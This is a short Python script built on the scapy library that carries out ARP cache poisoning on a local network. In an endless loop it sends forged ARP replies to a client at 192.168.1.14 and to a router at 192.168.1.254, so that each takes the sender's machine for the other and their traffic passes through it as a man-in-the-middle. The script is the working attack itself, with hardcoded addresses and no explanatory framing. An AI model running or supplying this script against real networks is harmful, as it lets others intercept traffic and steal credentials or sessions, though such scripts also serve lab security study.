import scapy.all as scapy 
import time

while True:
	pkt_for_client = scapy.ARP(op = 2, pdst = '192.168.1.14', hwdst = '08:00:27:bd:71:d2', psrc = '192.168.1.254')
	scapy.send(pkt_for_client)

	pkt_for_router = scapy.ARP(op = 2, pdst = '192.168.1.254', hwdst = '10:50:72:21:69:28', psrc = '192.168.1.14')
	scapy.send(pkt_for_router)

	time.sleep(5)